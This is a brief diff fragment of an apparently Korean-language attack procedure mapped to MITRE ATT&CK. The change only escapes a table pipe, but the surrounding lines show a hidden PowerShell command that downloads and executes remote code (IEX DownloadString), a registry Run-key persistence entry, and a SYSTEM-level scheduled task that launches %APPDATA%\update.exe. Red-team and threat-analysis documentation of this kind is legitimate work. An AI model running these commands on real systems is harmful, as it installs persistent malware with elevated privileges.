@@ -34,7 +34,7 @@ powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadStrin
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "%APPDATA%\update.exe"
 ```
 
-| 2-3   | T1053.005 – Scheduled Task              | SYSTEM 권한 확보 위한 예약 작업 생성      |
+\| 2-3   | T1053.005 – Scheduled Task              | SYSTEM 권한 확보 위한 예약 작업 생성      |
 
 ```cmd
 schtasks /Create /RU SYSTEM /SC ONSTART /TN "SvcInit" /TR "%APPDATA%\update.exe"
